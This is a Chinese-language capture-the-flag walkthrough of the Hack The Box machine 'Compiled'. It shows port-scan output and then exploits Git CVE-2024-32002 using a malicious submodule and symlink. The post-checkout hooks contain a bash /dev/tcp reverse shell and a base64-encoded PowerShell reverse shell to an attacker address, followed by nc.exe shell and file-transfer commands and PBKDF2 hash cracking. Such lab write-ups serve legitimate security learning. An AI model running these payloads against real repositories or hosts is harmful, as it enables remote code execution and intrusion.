---
layout: post
title: HTB——Compiled
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Compiled/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-25 11:28:20] [INFO] 暴力破解线程数: 1                                                   
[2025-04-25 11:28:20] [INFO] 开始信息扫描
[2025-04-25 11:28:20] [INFO] 最终有效主机数量: 1
[2025-04-25 11:28:20] [INFO] 开始主机扫描
[2025-04-25 11:28:20] [INFO] 有效端口数量: 233
[2025-04-25 11:28:22] [SUCCESS] 端口开放 10.129.110.48:3000
[2025-04-25 11:28:24] [SUCCESS] 端口开放 10.129.110.48:7680
[2025-04-25 11:28:28] [SUCCESS] 服务识别 10.129.110.48:3000 => [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]                 
[2025-04-25 11:28:39] [SUCCESS] 服务识别 10.129.110.48:7680 => 
[2025-04-25 11:28:39] [INFO] 存活端口数量: 2
[2025-04-25 11:28:39] [INFO] 开始漏洞扫描
[2025-04-25 11:28:39] [INFO] 加载的插件: webpoc, webtitle
[2025-04-25 11:28:42] [SUCCESS] 网站标题 http://10.129.110.48:3000 状态码:200 长度:13898  标题:Git                                                                                                
[2025-04-25 11:28:42] [SUCCESS] 发现指纹 目标: http://10.129.110.48:3000 指纹: [Gitea简易Git服务]
[2025-04-25 11:29:27] [SUCCESS] 扫描已完成: 4/4

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[11:28:22] [INFO] Start IpScan:10.129.110.48
[11:28:22] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[11:28:32] [+] 10.129.110.48:3000 open
[11:28:41] [+] 10.129.110.48:5000 open
[11:28:42] [+] [TCP/HTTP] [200] [gitea] http://10.129.110.48:3000 [Git]
[11:28:44] [+] 10.129.110.48:5985 open
[11:28:49] [+] [TCP/HTTP] [200] [jQuery-official website CDN][Werkzeug/3.0.3 Python/3.12.3] http://10.129.110.48:5000 [Compiled - Code Compiling Services]
[11:28:50] [+] 10.129.110.48:7680 open
[11:28:54] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.110.48:5985 [Not Found]
[11:28:54] [INFO] start WinRM check 10.129.110.48:5985
[11:28:54] [+] 开始 WinRMScan 任务: WinRM://10.129.110.48:5985
[11:28:58] [+] [TCP/PANDO-PUB]   10.129.110.48:7680
```

---

# 0x02 CVE-2024-32002复现

3000端口搭建了`Gitea`服务，我们先看看其版本，是`1.21.6`.再通过公开库查看其`git`版本。在公共库`Calculator`中，我们可以通过其Readme查看到服务器上运行的git版本，为`2.45.0.windows.1`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Compiled/02.png?raw=true)

查询CVE可知此版本有一个`CVE-2024-32002`供我们打RCE。首先我们使用自己的账户远程创建一个库并clone到本地。创建软连接并往内写入恶意代码

```bash
 ┌──(root㉿kali)-[/home/kali/HTB/Compiled]
└─# cd evil    
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# mkdir -p y/evil
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# vim y/evil/post-checkout
 #!/bin/bash
 bash -i >& /dev/tcp/YOUR_IP/8001 0>&1
 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# chmod +x y/evil/post-checkout
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# git config --global user.email "123@example.com"
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# git config --global user.name "ga1lo"    
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/evil]
└─# git commit -m "Add post-checkout hook"          
[main (root-commit) 308d399] Add post-checkout hook
 1 file changed, 2 insertions(+)
 create mode 100755 y/evil/post-checkout
```

接下来我们再创建一个`project`仓库，并完成如下操作

```bash
┌──(root㉿kali)-[/home/kali/HTB/Compiled]
└─# cd project 
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# ls -al
total 12
drwxrwxr-x 3 root root 4096 Apr 25 12:09 .
drwxrwxr-x 5 root root 4096 Apr 25 12:09 ..
drwxrwxr-x 7 root root 4096 Apr 25 12:09 .git
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git submodule add --name x/y http://10.129.110.48:3000/gailo/evil.git A/modules/x
Cloning into '/home/kali/HTB/Compiled/project/A/modules/x'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git commit -m "Add submodule with remote URL"
[main (root-commit) 1f81eda] Add submodule with remote URL
 2 files changed, 4 insertions(+)
 create mode 100644 .gitmodules
 create mode 160000 A/modules/x
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git push origin main
Username for 'http://10.129.110.48:3000': gailo
Password for 'http://gailo@10.129.110.48:3000': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (5/5), 411 bytes | 411.00 KiB/s, done.
Total 5 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.110.48:3000/gailo/project.git
 * [new branch]      main -> main
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# printf ".git" > dotgit.txt
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git hash-object -w --stdin < dotgit.txt > dot-git.hash
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git update-index --index-info < index.info
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git commit -m "Add symlink"
[main 64fd997] Add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 a
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Compiled/project]
└─# git push origin main       
Username for 'http://10.129.110.48:3000': gailo
Password for 'http://gailo@10.129.110.48:3000': 
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 297 bytes | 297.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.110.48:3000/gailo/project.git
   1f81eda..64fd997  main -> main
```

具体操作参考下列文章：

- [Exploiting CVE-2024-32002: RCE via git clone | Amal Murali](https://amalmurali.me/posts/git-rce/)

```bash
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main
rm -rf nothing
rm -rf toSeeHere
git clone http://10.129.26.85:3000/gailo/repo1.git
cd repo1
mkdir -p y/hooks
cat >y/hooks/post-checkout <<EOF
#!bin/sh.exe
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAiACwANQA0ADMAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==//反弹shell采用powershell base64格式
EOF
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push
cd ..
git clone http://10.129.26.85:3000/gailo/repo2.git
cd repo2
git submodule add --name x/y "http://10.129.26.85:3000/gailo/repo1.git" A/modules/x
git commit -m "add-submodule"
printf ".git" >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m "add-symlink"
git push
```

然后我们提交`repo2`的库链接，即可获得shell

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Compiled/03.png?raw=true)

但是我们此时接收到的shell是残血版。我们尝试上传`nc.exe`重新连接并查看Gitea相关内容。

```bash
nc.exe 攻击机IP 端口 -e cmd.exe		//将cmd调用到攻击机的shell上
nc -lvnp IP port > file  &  nc.exe IP port < file //使用nc.exe传输文件
```

翻出了db数据库文件后我们可发现其为`pbkdf2`的加密，且加上了salt。我们的hashcat需要指定新模式来爆破

爆破pbkdf2密码脚本请自行查找，爆破出的密码为`12345678`。winrm登陆即可

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Compiled/04.png?raw=true)